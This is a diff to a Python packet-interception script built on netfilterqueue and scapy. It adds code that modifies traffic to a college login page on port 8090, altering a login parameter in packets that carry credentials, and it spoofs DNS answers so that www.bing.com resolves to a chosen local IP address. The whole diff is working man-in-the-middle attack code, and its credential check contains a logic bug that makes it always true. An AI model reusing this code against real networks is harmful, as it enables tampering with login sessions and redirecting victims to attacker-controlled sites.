@@ -4,9 +4,18 @@
 
 import netfilterqueue as net
 import scapy.all as scapy
+import re
 
 def process_college_packet(packet):
+    # print(packet.show())
+    load = str(packet[scapy.Raw].load)
     print(packet.show())
+    load = load.replace("nmode=191", "nmode=193")
+
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    return packet
 def process_packet(packet):
     # Converting packet into scapy packet
     scapy_packet = scapy.IP(packet.get_payload())
@@ -14,7 +23,10 @@ def process_packet(packet):
     # For college login page spoofing
     if scapy_packet.haslayer(scapy.TCP):
         if scapy_packet[scapy.TCP].dport == 8090:
-            process_college_packet(scapy_packet)
+            if scapy_packet.haslayer(scapy.Raw):
+                if "username" or "passowrd" in scapy_packet[scapy.Raw].load:
+                    new_packet = process_college_packet(scapy_packet)
+                    packet.set_payload(bytes(new_packet))
 
     # DNS response spoofing
     if scapy_packet.haslayer(scapy.DNSRR):
@@ -22,10 +34,10 @@ def process_packet(packet):
         if "www.bing.com" in str(qname):
             print(f"[+] Spoofing {qname}")
             # print(scapy_packet.show())
-            ans = scapy.DNSRR(rrname=qname, rdata="192.168.146.129")
+            ans = scapy.DNSRR(rrname=qname, rdata="192.168.146.129") # rdata is the website which we want the user to visit
             scapy_packet[scapy.DNS].an = ans
             scapy_packet[scapy.DNS].ancount = 1
-
+            # print(scapy_packet.show())
             # Deleting the fields
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
